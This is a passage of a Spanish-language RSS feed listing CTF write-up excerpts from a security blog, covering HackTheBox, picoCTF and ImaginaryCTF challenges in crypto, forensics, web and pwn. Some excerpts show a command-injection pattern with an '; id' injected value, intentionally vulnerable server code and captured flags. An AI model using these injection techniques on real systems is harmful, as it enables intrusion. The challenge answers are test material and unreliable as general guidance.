Básicamente, el exploit dice que pongamos este payload como nuestro correo:</description></item><item><title>Logger</title><link>https://7rocky.github.io/ctf/htb-challenges/forensics/logger/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/forensics/logger/</guid><description>Se nos proporciona un archivo PCAP llamado keystrokes.pcapng con algunos eventos USB:
Identificando el dispositivo El segundo evento muestra que el dispositivo USB es un teclado:
Por lo tanto, necesitaremos analizar las pulsaciones de teclas. Los dispositivos de hardware utilizan un protocolo conocido como Human Interface Device (HID). Se puede encontrar más información en Wikipedia. De hecho, hay un manual de documentación adjunto: www.usb.org, donde se encuentran algunas tablas de HID (Sección 10: &amp;ldquo;Keyboard/Keypad Page (0x07)&amp;rdquo;):</description></item><item><title>Login Please</title><link>https://7rocky.github.io/ctf/imaginaryctf/login-please/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/imaginaryctf/login-please/</guid><description>Tenemos que iniciar sesión aquí: http://puzzler7.imaginaryctf.org:5001/:
Si inspeccionamos el código HTML de la página, veremos un comentario que apunta a /source:
Ahora tenemos el código fuente del servidor:
const express = require('express') const crypto = require('crypto') function md5(text) { return crypto.createHash('md5').update(text).digest('hex') } const app = express() const users = { guest: '084e0343a0486ff05530df6c705c8bb4', admin: '21232f297a57a5a743894a0e4a801fc3', '1337hacker': '2ab96390c7dbe3439de74d0c9b0b1767' } const localIPs = ['127.0.0.1', '::1', '::ffff:127.0.0.1'] app.use(express.urlencoded({ extended: false })) app.use(express.json()) app.get('/', (req, res) =&amp;gt; { res.</description></item><item><title>Lookey here</title><link>https://7rocky.github.io/ctf/picoctf/forensics/lookey-here/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/picoctf/forensics/lookey-here/</guid><description>Se nos proporciona un archivo de texto grande llamado anthem.flag.txt:
$ wc -l anthem.flag.txt 2146 anthem.flag.txt 2146 son muchas líneas para buscar la flag a ojo. En su lugar, podemos usar grep para encontrar la flag, ya que tienen un formato común (picoCTF{...}):
$ grep picoCTF anthem.flag.txt we think that the men of picoCTF{gr3p_15_@w3s0m3_4c479940}</description></item><item><title>looking glass</title><link>https://7rocky.github.io/ctf/htb-challenges/web/looking-glass/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/web/looking-glass/</guid><description>Se nos proporciona esta página web:
La funcionalidad que tiene es usar el comando ping:
El problema puede estar relacionado con inyección de comandos, porque probablemente el servidor hace algo como:
&amp;lt;?php $cmd = 'ping -c 4 ' . $_POST['ip_address']; system($cmd); A lo mejor no en PHP, pero el concepto es el mismo. Por tanto, podemos probar a poner un punto y coma e inyectar otro comando de sistema (; id):</description></item><item><title>Lost Flag</title><link>https://7rocky.github.io/ctf/imaginaryctf/lost-flag/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/imaginaryctf/lost-flag/</guid><description>Se nos proporciona un archivo ZIP llamado flag.zip que contiene una imagen JPEG y también un archivo llamado .DS_Store, que es un archivo temporal que aparece en máquinas macOS:
$ file flag.zip flag.zip: Zip archive data, at least v2.0 to extract, compression method=store $ unzip -v flag.zip Archive: flag.zip Length Method Size Cmpr Date Time CRC-32 Name -------- ------ ------- ---- ---------- ----- -------- ---- 0 Stored 0 0% 07-03-2022 05:49 00000000 flag/ 86710 Defl:N 86391 0% 07-03-2022 05:29 a0cfb753 flag/flag.</description></item><item><title>Lost Modulus</title><link>https://7rocky.github.io/ctf/htb-challenges/crypto/lost-modulus/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/crypto/lost-modulus/</guid><description>Se nos proporciona un código en Python para cifrar la flag, y nos dan el texto cifrado en hexadecimal:
#!/usr/bin/python3 from Crypto.Util.number import getPrime, long_to_bytes, inverse flag = open('flag.txt', 'r').read().strip().encode() class RSA: def __init__(self): self.p = getPrime(512) self.q = getPrime(512) self.e = 3 self.n = self.p * self.q self.d = inverse(self.e, (self.p-1)*(self.q-1)) def encrypt(self, data: bytes) -&amp;gt; bytes: pt = int(data.hex(), 16) ct = pow(pt, self.e, self.n) return long_to_bytes(ct) def decrypt(self, data: bytes) -&amp;gt; bytes: ct = int(data.</description></item><item><title>LoveTok</title><link>https://7rocky.github.io/ctf/htb-challenges/web/lovetok/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/web/lovetok/</guid><description>Se nos proporciona el siguiente sitio web:
También disponemos sel código fuente en PHP del servidor.
Análisis del código fuente Solo hay un controlador (controllers/TimeController.php):
&amp;lt;?php class TimeController { public function index($router) { $format = isset($_GET['format']) ? $_GET['format'] : 'r'; $time = new TimeModel($format); return $router-&amp;gt;view('index', ['time' =&amp;gt; $time-&amp;gt;getTime()]); } } Como se puede ver, se necesita un parámetro format y se hace una llamada a TimeModel (models/TimeModel.php):
&amp;lt;?php class TimeModel { public function __construct($format) { $this-&amp;gt;format = addslashes($format); [ $d, $h, $m, $s ] = [ rand(1, 6), rand(1, 23), rand(1, 59), rand(1, 69) ]; $this-&amp;gt;prediction = "</description></item><item><title>Lucky Faucet</title><link>https://7rocky.github.io/ctf/other/htb-cyber-apocalypse/lucky-faucet/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/htb-cyber-apocalypse/lucky-faucet/</guid><description>Se nos proporciona un archivo de Solidity llamado LuckyFaucet.sol:
// SPDX-License-Identifier: MIT pragma solidity 0.7.6; contract LuckyFaucet { int64 public upperBound; int64 public lowerBound; constructor() payable { // start with 50M-100M wei Range until player changes it upperBound = 100_000_000; lowerBound = 50_000_000; } function setBounds(int64 _newLowerBound, int64 _newUpperBound) public { require(_newUpperBound &amp;lt;= 100_000_000, "100M wei is the max upperBound sry"); require(_newLowerBound &amp;lt;= 50_000_000, "50M wei is the max lowerBound sry"</description></item><item><title>Lucky Number</title><link>https://7rocky.github.io/ctf/other/hack.lu-ctf/lucky-number/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/hack.lu-ctf/lucky-number/</guid><description>Se nos proporciona el código fuente del servidor en Python:
#!/usr/bin/env python #hacklu23 Baby Crypyo Challenge import math import random from Crypto.Cipher import AES from Crypto.Random import get_random_bytes import base64 import os def add(e): return e+(length-len(e)%length)*chr(length-len(e)%length) def remove(e): return e[0:-ord(e[-1:])] length=16 def main(): flag= os.environ["FLAG"] print("Starting Challenge") key=get_random_bytes(32) message=add(flag) iv=get_random_bytes(length) cipher=AES.new(key,AES.MODE_CBC,iv) cipher_bytes=base64.b64encode(iv+cipher.encrypt(message.encode("utf8"))) print(cipher_bytes.decode()) for l in range(0,5): A=[] print("You know the moment when you have this special number that gives you luck?</description></item><item><title>LunaCrypt</title><link>https://7rocky.github.io/ctf/htb-challenges/crypto/lunacrypt/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/crypto/lunacrypt/</guid><description>Se nos proporciona el resultado de un cifrado personalizado y su código fuente. Sin embargo, el código fuente es difícil de leer porque hay muchas funciones:
import math from random import randint, seed from time import time, process_time strchr = lambda x: chr(x) strbyt = lambda x, y=0: ord(x[y]) bitlst = lambda x, y: x &amp;lt;&amp;lt; y bitrst = lambda x, y: x &amp;gt;&amp;gt; y bitext = lambda x, y, z=1: bitrst(x, y) &amp;amp; int(math.</description></item><item><title>Lure</title><link>https://7rocky.github.io/ctf/htb-challenges/forensics/lure/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/forensics/lure/</guid><description>Se nos proporciona un archivo de Microsoft Office Word llamado UrgentPayment.doc:
$ file UrgentPayment.doc UrgentPayment.doc: Composite Document File V2 Document, Little Endian, Os: Windows, Version 10.0, Code page: 1252, Author: Ian Austin, Template: Normal.dotm, Last Saved By: egre55, Revision Number: 4, Name of Creating Application: Microsoft Office Word, Total Editing Time: 40:00, Create Time/Date: Tue Nov 3 18:07:00 2020, Last Saved Time/Date: Tue Nov 3 18:57:00 2020, Number of Pages: 1, Number of Words: 2, Number of Characters: 12, Security: 0 Extracción de macros VBA Con olevba de oletools podemos extraer el código VBA de las macros:</description></item><item><title>M0rsarchive</title><link>https://7rocky.github.io/ctf/htb-challenges/misc/m0rsarchive/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/misc/m0rsarchive/</guid><description>Se nos proporcionan estos archivos:
$ file * flag_999.zip: Zip archive data, at least v1.0 to extract, compression method=store pwd.png: PNG image data, 25 x 3, 8-bit/color RGB, non-interlaced Pruebas El archivo ZIP está protegido con contraseña, y esta es pwd.png:
Es bastante difícil distinguir lo que está codificado en la imagen, pero en realidad es código Morse. Esta vez, contiene &amp;ldquo;9&amp;rdquo;. Podemos suponer que es la contraseña para el archivo ZIP:</description></item><item><title>Manager</title><link>https://7rocky.github.io/ctf/htb-challenges/mobile/manager/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/mobile/manager/</guid><description>Se nos proporciona un archivo APK (Manager.apk) y un archivo README.txt:
1. Install this application in an API Level 29 or earlier (i.e. Android 10.0 (Google APIs)). 1. In order to connect to the server when first running the application, insert the IP and PORT that you are provided in the description. Como se puede ver, la aplicación Android se conectará a un servidor remoto, por lo que probablemente analizaremos esa comunicación.</description></item><item><title>MarketDump</title><link>https://7rocky.github.io/ctf/htb-challenges/forensics/marketdump/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/forensics/marketdump/</guid><description>Se nos proporciona un archivo PCAP con muchos segmentos TCP:
Análisis de tráfico de red Podemos abrirlo en Wireshark y echar un vistazo a todos los protocolos capturados en el archivo (&amp;quot;Statistics &amp;gt; Protocol Hierarchy&amp;quot;):
El protocolo más sospechoso que se ha utilizado es Telnet, que es un protocolo que se emplea para conectarse a otra máquina. Sin embargo, no es seguro porque todo viaja en texto claro. Además, podemos ver que 46 paquetes estaban usando Telnet.</description></item><item><title>Math Door</title><link>https://7rocky.github.io/ctf/htb-challenges/pwn/math-door/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/pwn/math-door/</guid><description>Se nos proporciona un binario de 64 bits llamado math-door:
Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled RUNPATH: b'.' Configuración del entorno También se nos proporciona la librería y el cargador de Glibc remotos:
$ ./ld.so ./libc.so.6 GNU C Library (Ubuntu GLIBC 2.31-0ubuntu9.9) stable release version 2.31. Copyright (C) 2020 Free Software Foundation, Inc. This is free software; see the source for copying conditions.</description></item><item><title>Math Door</title><link>https://7rocky.github.io/ctf/other/htb-cyber-apocalypse/math-door/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/htb-cyber-apocalypse/math-door/</guid><description>Se nos proporciona un binario de 64 bits llamado math-door:
Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled RUNPATH: b'.' Configuración del entorno También se nos proporciona la librería y el cargador de Glibc remotos:
$ ./ld.so ./libc.so.6 GNU C Library (Ubuntu GLIBC 2.31-0ubuntu9.9) stable release version 2.31. Copyright (C) 2020 Free Software Foundation, Inc. This is free software; see the source for copying conditions.</description></item><item><title>Mayday Mayday</title><link>https://7rocky.github.io/ctf/htb-challenges/crypto/mayday-mayday/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/crypto/mayday-mayday/</guid><description>Se nos proporciona el código fuente en Python para cifrar la flag:
from Crypto.Util.number import getPrime, GCD, bytes_to_long from secret import FLAG from random import randint class Crypto: def __init__(self, bits): self.bits = bits self.alpha = 1/9 self.delta = 1/4 self.known = int(self.bits*self.delta) def keygen(self): while True: p, q = [getPrime(self.bits//2) for _ in '__'] self.e = getPrime(int(self.bits*self.alpha)) φ = (p-1)*(q-1) try: dp = pow(self.e, -1, p-1) dq = pow(self.e, -1, q-1) self.</description></item><item><title>Mayday Mayday</title><link>https://7rocky.github.io/ctf/other/htb-unictf/mayday-mayday/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/htb-unictf/mayday-mayday/</guid><description>Se nos proporciona el código fuente en Python para cifrar la flag:
from Crypto.Util.number import getPrime, GCD, bytes_to_long from secret import FLAG from random import randint class Crypto: def __init__(self, bits): self.bits = bits self.alpha = 1/9 self.delta = 1/4 self.known = int(self.bits*self.delta) def keygen(self): while True: p, q = [getPrime(self.bits//2) for _ in '__'] self.e = getPrime(int(self.bits*self.alpha)) φ = (p-1)*(q-1) try: dp = pow(self.e, -1, p-1) dq = pow(self.e, -1, q-1) self.</description></item><item><title>Maze</title><link>https://7rocky.github.io/ctf/overthewire/maze/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/overthewire/maze/</guid><description>Este laboratorio sirve para practicar técnicas de explotación, programación e ingeniería inversa. El laboratorio consta de 9 niveles, en una arquitectura Linux/x86 (todas las protecciones están deshabilitadas: NX, PIE, canarios e incluso ASLR).
Para conectarse al primer nivel, se nos proporcionan las credenciales de SSH para el usuario maze0.
Realizando un reconocimiento inicial, la máquina nos muestra que hay binarios SUID que deben ser explotados para pasar al siguiente nivel. Además, tenemos algunos archivos que contienen las contraseñas de los usuarios mazeX:</description></item><item><title>Maze of Mist</title><link>https://7rocky.github.io/ctf/other/htb-cyber-apocalypse/maze-of-mist/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/htb-cyber-apocalypse/maze-of-mist/</guid><description>Se nos proporciona una imagen de kernel vmlinuz-linux comprimida, un sistema de archivos initramfs.cpio.gz y un script run.sh:
$ unzip -l pwn_maze_of_mist.zip Archive: pwn_maze_of_mist.zip Length Date Time Name --------- ---------- ----- ---- 0 2024-02-06 09:30 maze_of_mist/ 1347202 2024-02-06 09:29 maze_of_mist/initramfs.cpio.gz 291 2024-02-06 09:26 maze_of_mist/run.sh 12886816 2024-02-06 09:26 maze_of_mist/vmlinuz-linux --------- ------- 14234309 4 files $ unzip pwn_maze_of_mist.zip Archive: pwn_maze_of_mist.zip creating: maze_of_mist/ inflating: maze_of_mist/initramfs.cpio.gz inflating: maze_of_mist/run.sh inflating: maze_of_mist/vmlinuz-linux Si descomprimimos el sistema de archivos, encontramos un binario de 32 bits llamado target:</description></item><item><title>Micro-CMS v1</title><link>https://7rocky.github.io/ctf/hacker101ctf/micro-cms-v1/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/hacker101ctf/micro-cms-v1/</guid><description>Tenemos una página web sencilla que nos permite editar y crear artículos en Markdown:
Vamos a pinchar en &amp;ldquo;Testing&amp;rdquo;:
Ahora, podemos intentar editar el artículo actual. Se nos muestra una caja de texto para escribir el código Markdown ahí:
Markdown es un lenguaje de marcado similar a HTML pero más sencillo. Además, Markdown soporta el uso de etiquetas HTML. Por tanto, podemos intentar a poner un payload de Cross-Site Scripting (XSS) como este:</description></item><item><title>Milkshake</title><link>https://7rocky.github.io/ctf/htb-challenges/misc/milkshake/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/misc/milkshake/</guid><description>Se nos proporciona un archivo MP3 llamado Milkshake.mp3. Podemos echar un vistazo a las cadenas de caracteres imprimibles o los metadatos:
$ file Milkshake.mp3 Milkshake.mp3: Audio file with ID3 version 2.4.0, extended header, contains:MPEG ADTS, layer III, v1, 128 kbps, 44.1 kHz, JntStereo MPEG ADTS, layer III, v1, 128 kbps, 44.1 kHz, JntStereo $ strings -20 Milkshake.mp3 The Neptunes Present-Clones-ADTRCK 000007A5 000006CA 00007311 000075EA 0001A567 0001A567 00008000 00008000 0000005C 0000005CCOMM 000007A5 000006CA 00007311 000075EA 0001A567 0001A567 00008000 00008000 0000005C 0000005CTPE1 Chad Hugo/Pharrell Williams !</description></item><item><title>Mind your Ps and Qs</title><link>https://7rocky.github.io/ctf/picoctf/cryptography/mind-your-ps-and-qs/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/picoctf/cryptography/mind-your-ps-and-qs/</guid><description>Tenemos la salida de un cifrado RSA:
Decrypt my super sick RSA: c: 240986837130071017759137533082982207147971245672412893755780400885108149004760496 n: 831416828080417866340504968188990032810316193533653516022175784399720141076262857 e: 65537 Contexto de RSA RSA funciona de manera que, dado un mensaje $m$ en formato decimal, podemos cifrarlo como sigue:
$$ c = m^e \mod{n} $$ Y para descifrar, se necesitan dos valores más: $\phi(n) = (p - 1) (q - 1)$ y $d = e^{-1} \mod{\phi(n)}$, de manera que:
$$ m = c^d \mod{n} $$ Vulnerabilidad El módulo $n$ es relativamente corto, y por tanto se puede factorizar fácilmente Podemos encontrar los factores $p$ y $q$ con factor.</description></item><item><title>Mini Line</title><link>https://7rocky.github.io/ctf/htb-challenges/hardware/mini-line/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/hardware/mini-line/</guid><description>Se nos proporciona un archivo llamado firmware.hex que se ve así:
:100154002F6C69622F6C642D6C696E75782E736FC9 :030164002E330037 :10016800040000001400000003000000474E550082 :10017800891BDEC57F0B4D5D5D0569FF4FE7A53423 :04018800F5185E41C7 :10018C00040000001000000001000000474E550064 :10019C00000000000300000002000000000000004E :1001AC000100000001000000010000000000000040 :0801BC0000000000000000003B :1001C400000000000000000000000000000000002B :1001D40000000000780300000000000003000B0092 :1001E40000000000381001000000000003001600A9 :1001F40007000000000000000000000022000000D2 :100204003C0000000000000000000000200000008E :1002140016000000000000000000000012000000B2 :100224005800000000000000000000002000000052 :100234006700000000000000000000002000000033 :100244000100000000000000000000001200000097 :100254000061626F7274005F5F6378615F66696EEC :10026400616C697A65005F5F6C6962635F73746176 :1002740072745F6D61696E006C6962632E736F2EB8 :100284003600474C4942435F322E34005F49544D97 :100294005F64657265676973746572544D436C6F0E :1002A4006E655461626C65005F5F676D6F6E5F734E :1002B400746172745F5F005F49544D5F7265676972 :1002C40073746572544D436C6F6E655461626C65F2 :0102D4000029 :1002D6000000000000000200000002000000000014 :0202E600020014 :1002E80001000100280000001000000000000000CC :1002F8001469690D000002003200000000000000CF :10030800080F0100170000000C0F01001700000083 :100318001C100100170000002C100100170000003D :1003280030100100170000003C1001001700000009 :10033800201001001503000024100100150400001E :1003480028100100150600003410010015070000F0 :100358000C10010016030000101001001605000023 :1003680014100100160600001810010016080000FD :0C03780008402DE9270000EB0880BDE8DC :1003840004E02DE504E09FE50EE08FE008F0BEE513 :100394006C0C010000C68FE210CA8CE26CFCBCE558 :1003A40000C68FE210CA8CE264FCBCE500C68FE292 :1003B40010CA8CE25CFCBCE500C68FE210CA8CE279 :0403C40054FCBCE544 :1003C80000B0A0E300E0A0E304109DE40D20A0E14C :1003D80004202DE504002DE528A09FE524308FE2B8 :1003E80003A08AE020C09FE50CC09AE704C02DE571 :1003F80018309FE503309AE714009FE500009AE75C :10040800E5FFFFEBEAFFFFEBF00B01001C0000002B :100418002C0000003000000014309FE514209FE5F8 :1004280003308FE0022093E7000052E31EFF2F0104 :10043800DCFFFFEAD00B0100280000002C009FE53C :100448002C309FE500008FE003308FE0000053E17F :1004580020309FE503308FE01EFF2F0118209FE515 :10046800023093E7000053E31EFF2F0113FF2FE133 :10047800EC0B0100E80B01009C0B010024000000BC :1004880038009FE538109FE500008FE001108FE0ED :10049800001041E0A13FA0E1411183E024309FE535 :1004A800C110B0E103308FE01EFF2F0118209FE537 :1004B800023093E7000053E31EFF2F0113FF2FE1E3 :1004C800A80B0100A40B01004C0B01003400000034 :1004D8004C309FE54C209FE503308FE00030D3E59A :1004E80002208FE0000053E31EFF2F1138309FE5F4 :1004F80010402DE9033092E7000053E30200000AA0 :1005080028309FE503009FE7A0FFFFEBCAFFFFEB42 :100518001C309FE50120A0E303308FE00020C3E5F5 :100528001080BDE8580B0100100B010020000000EE :10053800280B0100180B0100D0FFFFEA04B02DE5DD :1005480000B08DE20CD04DE20030A0E105304BE563 :1005580050309FE5003093E5FF3CC3E305205BE5A1 :100568000224A0E10210A0E138209FE5013083E1D8 :10057800003082E530309FE50528A0E3002083E5C0 :1005880028309FE50228A0E3002083E51C309FE582 :100598000127A0E3002083E50000A0E100D08BE262 :1005A80004B09DE41EFF2FE1008002E0048002E019 :1005B8000C8002E000482DE904B08DE210D04DE235 :1005C80010000BE50030A0E305304BE5080000EA19 :1005D80005305BE510201BE5033082E00030D3E5F1 :1005E8000300A0E1D4FFFFEB05305BE5013083E2B7 :1005F80005304BE505305BE510201BE5033082E054 :100608000030D3E5000053E3F0FFFF1A0000A0E13B :100618000000A0E104D04BE20088BDE804B02DE55D :1006280000B08DE234309FE5003093E52C209FE543 :10063800153C83E3003082E524309FE52020A0E3C9 :10064800B020C3E11C309FE51020A0E30020C3E5E3 :100658000000A0E100D08BE204B09DE41EFF2FE172 :1006680000C002E0000002E00C0002E004B02DE54A :1006780000B08DE214D04DE20030A0E10D304BE522 :1006880068309FE58020A0E3002083E560209FE597 :100698000D305BE50338A0E12338A0E1B030C2E1BA :1006A8000000A0E14C309FE50030D3E5FF3003E2C5 :1006B800033CA0E1433CA0E1000053E3F8FFFFAA9C :1006C8002C309FE5B030D3E10338A0E12338A0E116 :1006D80005304BE520309FE58020A0E3002083E52E :1006E8000000A0E100D08BE204B09DE41EFF2FE1E2 :1006F8000C8002E0080002E0040002E0048002E04E :1007080000482DE904B08DE230D04DE26C319FE510 :1007180003308FE020C04BE20F0093E80F008CE815 :100728005C319FE524300BE558319FE503308FE0BD :1007380034C04BE20F0093E80700ACE80030CCE58A :1007480044319FE503308FE00300A0E198FFFFEB01 :10075800B1FFFFEB34319FE503308FE00300A0E1E8 :1007680093FFFFEB0100A0E3BFFFFFEB20319FE504 :1007780003308FE00300A0E18DFFFFEB0030A0E322 :1007880008300BE50A0000EA20204BE208301BE5A0 :10079800033082E00030D3E51A3023E2FF3003E271 :1007A8000300A0E1B0FFFFEB08301BE5013083E256 :1007B80008300BE508301BE5100053E3F1FFFFDAC2 :1007C8000030A0E30C300BE50C0000EA24204BE2DB :1007D8000C301BE5033082E00030D3E5A330A0E104 :1007E800FF3003E2393023E2FF3003E20300A0E1E7 :1007F8009DFFFFEB0C301BE5013083E20C300BE56D :100808000C301BE5040053E3EFFFFFDA0030A0E3F0 :1008180010300BE50C0000EA34204BE210301BE5E9 :10082800033082E00030D3E5A330A0E1FF3003E2DB :10083800393023E2FF3003E20300A0E18AFFFFEB37 :1008480010301BE5013083E210300BE510301BE55A :100858000D0053E3EFFFFFDA38309FE503308FE0F8 :100868000300A0E152FFFFEB0000A0E37EFFFFEBD7 :100878000030A0E30300A0E104D04BE20088BDE80B :10088800E00200001A9614CCD402000050020000C6 :10089800500200004802000078010000F0472DE9EE :1008A8004C609FE54C509FE506608FE005508FE057 :1008B800056046E00070A0E10180A0E10290A0E19F :1008C800AAFEFFEB4661B0E1F087BD080040A0E357 :1008D800043095E40920A0E10810A0E10700A0E198 :1008E800014084E233FF2FE1040056E1F7FFFF1ACD :1008F800F087BDE8540601004C0601001EFF2FE1F9 :0809080008402DE90880BDE85C :10091000010002003A0000003D0000000A00000053 :100920003D0000000F0000003D000000240000001A :100930003D000000320000003D0000000200000009 :100940003D000000050000003D0000001300000015 :100950003D0000000D0000003D0000000C00000004 :100960003D000000230000003D00000011000000D9 :100970003D000000260000003D00000001000000D6 :100980003D000000170000003D00000008000000CE :100990003D000000090000003D00000000000000D4 :1009A0000000000053504920496E697469616C6908 :1009B0007A6174696F6E00005374617274206269A9 :1009C00074207365740000005472616E736D6974F5 :1009D00074696E67206461746120746F20736C6148 :1009E0007665000044617461207472616E7366659F :1009F0007220697320636F6D706C657465640000AC :100A0000524E5861782E68294577296E2E766945B1 :100A1000BE98AECC1412BABE103030308800000040 :100A20003A0000003D0000000A0000003D00000008 :100A30000F0000003D000000240000003D00000009 :100A4000320000003D000000020000003D000000F8 :100A5000050000003D000000130000003D00000004 :100A60000D0000003D0000000C0000003D000000F3 :100A7000230000003D000000110000003D000000C8 :100A8000260000003D000000010000003D000000C5 :100A9000170000003D000000080000003D000000BD :100AA000090000003D000000000000000000000000 :080AB00018F9FF7F01000000AE :040AB800000000003A :020000021000EC :040F080040050000A0 :040F0C00D804000005 :100F100001000000280000000C0000007803000021 :100F20000D0000000809000019000000080F010072 :100F30001B000000040000001A0000000C0F01005C :100F40001C00000004000000F5FEFF6FAC01000073 :100F5000050000005402000006000000C40100006B :100F60000A000000810000000B00000010000000DB :100F70001500000000000000030000000010010048 :100F8000020000002000000014000000110000001A :100F900017000000580300001100000008030000C3 :100FA00012000000500000001300000008000000C4 :100FB000FBFFFF6F00000008FEFFFF6FE80200006C :100FC000FFFFFF6F01000000F0FFFF6FD60200007F :100FD000FAFFFF6F060000000000000000000000A4 :100FE0000000000000000000000000000000000001 :100FF00000000000000000000000000000000000F1 :10100000100F010000000000000000008403000039 :10101000840300008403000084030000040900002E :10102000000000000000000000000000A408000014 :081030000807000000000000A9 :08103800000000003C10010063 :04000003000003C82E :00000001FF Solo sabemos que este es el firmware de un microcontrolador LPC2148 que está enviando datos.</description></item><item><title>misDIRection</title><link>https://7rocky.github.io/ctf/htb-challenges/misc/misdirection/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/misc/misdirection/</guid><description>Se nos proporciona un archivo ZIP:
$ file misDIRection.zip misDIRection.zip: Zip archive data, at least v1.0 to extract Lo descomprimimos y vemos lo siguiente:
$ unzip -P hackthebox misDIRection.zip Archive: misDIRection.zip creating: .secret/ creating: .secret/S/ extracting: .secret/S/1 creating: .secret/V/ extracting: .secret/V/35 creating: .secret/F/ extracting: .secret/F/2 extracting: .secret/F/19 extracting: .secret/F/27 creating: .secret/o/ creating: .secret/H/ creating: .secret/A/ creating: .secret/f/ creating: .secret/r/ creating: .secret/m/ creating: .secret/B/ extracting: .secret/B/23 creating: .secret/a/ creating: .secret/O/ creating: .</description></item><item><title>Missing in Action</title><link>https://7rocky.github.io/ctf/htb-challenges/osint/missing-in-action/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/osint/missing-in-action/</guid><description>Tenemos esta descripción del reto:
Roland Sanchez from Birmingham, UK is missing. The family are convinced he was kidnapped on a business trip. Can you help?
LinkedIn Podemos comenzar ingresando algunas palabras clave en un motor de búsqueda:
Lo primero que sale es LinkedIn:
Aquí tenemos el nombre de la empresa: Egotistical Bank.
Twitter Si ponemos el nombre de la empresa en un motor de búsqueda, lo primero que sale es Twitter:</description></item><item><title>mixup</title><link>https://7rocky.github.io/ctf/imaginaryctf/mixup/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/imaginaryctf/mixup/</guid><description>Se nos proporciona un archivo flag.txt que contiene algunos caracteres Unicode. Este es el volcado hexadecimal del archivo:
$ xxd flag.txt 00000000: 69e2 808e 63e2 80ae 74e2 808e 66e2 80ae i...c...t...f... 00000010: 7be2 808e e280 8e75 6e31 6330 e280 ae64 {......un1c0...d 00000020: 655f 6de2 80ae 3467 3163 5f6e 61e2 808e e_m...4g1c_na... 00000030: e280 ae68 e280 8e73 e280 ae64 e280 ae66 ...h...s...d...f 00000040: 6fe2 80ae e280 8e61 7369 e280 8e68 e280 o.</description></item><item><title>Mod 26</title><link>https://7rocky.github.io/ctf/picoctf/cryptography/mod-26/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/picoctf/cryptography/mod-26/</guid><description>Se nos proporciona un mensaje cifrado:
cvpbPGS{arkg_gvzr_V'yy_gel_2_ebhaqf_bs_ebg13_GYpXOHqX} Vemos que el mensaje tiene más o menos el formato de una flag de picoCTF (picoCTF{...}), ya que hay 4 letras minúsculas y 3 mayúsculas antes de {, y termina con }. Además, también hay varios _.
Parece claro que el algoritmo de cifrado utilizado es de sustitución (cifrado César). El algoritmo más común es ROT13. Utilizando CyberChef, podemos descifrar el mensaje utilizando ROT13 y ver la flag:</description></item><item><title>Model E1337 - Rolling Code Lock</title><link>https://7rocky.github.io/ctf/hacker101ctf/model-e1337---rolling-code-lock/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/hacker101ctf/model-e1337---rolling-code-lock/</guid><description>Tenemos una simple página web que solicita un código para desbloquear:
Podemos poner cualquier número y, después de unos segundos, veremos que es incorrecto:
No hay nada en el código fuente de la página. En este punto, podemos aplicar fuzzing para enumerar más rutas existentes:
